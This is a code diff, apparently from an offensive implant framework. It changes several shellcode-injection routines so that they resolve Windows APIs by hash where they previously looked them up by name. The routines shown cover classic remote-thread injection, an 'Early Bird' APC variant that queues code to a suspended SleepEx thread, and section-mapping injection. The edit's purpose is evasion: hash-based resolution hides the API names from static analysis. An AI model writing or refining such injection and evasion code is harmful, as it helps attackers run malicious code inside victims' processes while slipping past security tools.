@@ -74,13 +74,13 @@ static auto declfn inject_shellcode(
     auto k32 = inst.kernel32.handle;
 
     auto pVirtualAllocEx = reinterpret_cast<fn_VirtualAllocEx>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
+        resolve::_api( k32, expr::hash_string( "VirtualAllocEx" ) ) );
     auto pWriteProcessMemory = reinterpret_cast<fn_WriteProcessMemory>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
+        resolve::_api( k32, expr::hash_string( "WriteProcessMemory" ) ) );
     auto pVirtualProtectEx = reinterpret_cast<fn_VirtualProtectEx>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualProtectEx" ) ) );
+        resolve::_api( k32, expr::hash_string( "VirtualProtectEx" ) ) );
     auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );
+        resolve::_api( k32, expr::hash_string( "CreateRemoteThread" ) ) );
 
     if ( !pVirtualAllocEx || !pWriteProcessMemory ||
          !pVirtualProtectEx || !pCreateRemoteThread )
@@ -126,15 +126,15 @@ static auto declfn inject_shellcode(
     auto k32 = inst.kernel32.handle;
 
     auto pVirtualAllocEx = reinterpret_cast<fn_VirtualAllocEx>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
+        resolve::_api( k32, expr::hash_string( "VirtualAllocEx" ) ) );
     auto pWriteProcessMemory = reinterpret_cast<fn_WriteProcessMemory>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
+        resolve::_api( k32, expr::hash_string( "WriteProcessMemory" ) ) );
     auto pVirtualProtectEx = reinterpret_cast<fn_VirtualProtectEx>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualProtectEx" ) ) );
+        resolve::_api( k32, expr::hash_string( "VirtualProtectEx" ) ) );
     auto pQueueUserAPC = reinterpret_cast<fn_QueueUserAPC>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "QueueUserAPC" ) ) );
+        resolve::_api( k32, expr::hash_string( "QueueUserAPC" ) ) );
     auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );
+        resolve::_api( k32, expr::hash_string( "CreateRemoteThread" ) ) );
 
     if ( !pVirtualAllocEx || !pWriteProcessMemory ||
          !pVirtualProtectEx || !pQueueUserAPC || !pCreateRemoteThread )
@@ -154,8 +154,8 @@ static auto declfn inject_shellcode(
     /* Create suspended thread, queue APC, then resume - Early Bird pattern */
     HANDLE h_thread = pCreateRemoteThread(
         h_proc, nullptr, 0,
-        (LPTHREAD_START_ROUTINE)inst.kernel32.GetProcAddress(
-            (HMODULE)k32, symbol<LPCSTR>( "SleepEx" ) ),
+        (LPTHREAD_START_ROUTINE)resolve::_api(
+            k32, expr::hash_string( "SleepEx" ) ),
         (LPVOID)INFINITE, CREATE_SUSPENDED, nullptr );
 
     if ( !h_thread ) return nullptr;
@@ -164,7 +164,7 @@ static auto declfn inject_shellcode(
 
     typedef DWORD ( WINAPI *fn_ResumeThread )( HANDLE );
     auto pResumeThread = reinterpret_cast<fn_ResumeThread>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "ResumeThread" ) ) );
+        resolve::_api( k32, expr::hash_string( "ResumeThread" ) ) );
     if ( pResumeThread ) pResumeThread( h_thread );
 
     return h_thread;
@@ -203,7 +203,7 @@ static auto declfn inject_shellcode(
     auto pNtUnmapViewOfSection = reinterpret_cast<fn_NtUnmapViewOfSection>(
         resolve::_api( ntd, expr::hash_string( "NtUnmapViewOfSection" ) ) );
     auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );
+        resolve::_api( k32, expr::hash_string( "CreateRemoteThread" ) ) );
 
     if ( !pNtCreateSection || !pNtMapViewOfSection ||
          !pNtUnmapViewOfSection || !pCreateRemoteThread )
@@ -280,13 +280,13 @@ static auto declfn inject_shellcode(
     auto k32 = inst.kernel32.handle;
 
     auto pVirtualAllocEx = reinterpret_cast<fn_VirtualAllocEx>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
+        resolve::_api( k32, expr::hash_string( "VirtualAllocEx" ) ) );
     auto pWriteProcessMemory = reinterpret_cast<fn_WriteProcessMemory>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
+        resolve::_api( k32, expr::hash_string( "WriteProcessMemory" ) ) );
     auto pVirtualProtectEx = reinterpret_cast<fn_VirtualProtectEx>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualProtectEx" ) ) );
+        resolve::_api( k32, expr::hash_string( "VirtualProtectEx" ) ) );
     auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );
+        resolve::_api( k32, expr::hash_string( "CreateRemoteThread" ) ) );
 
     if ( !pVirtualAllocEx || !pWriteProcessMemory ||
          !pVirtualProtectEx || !pCreateRemoteThread )
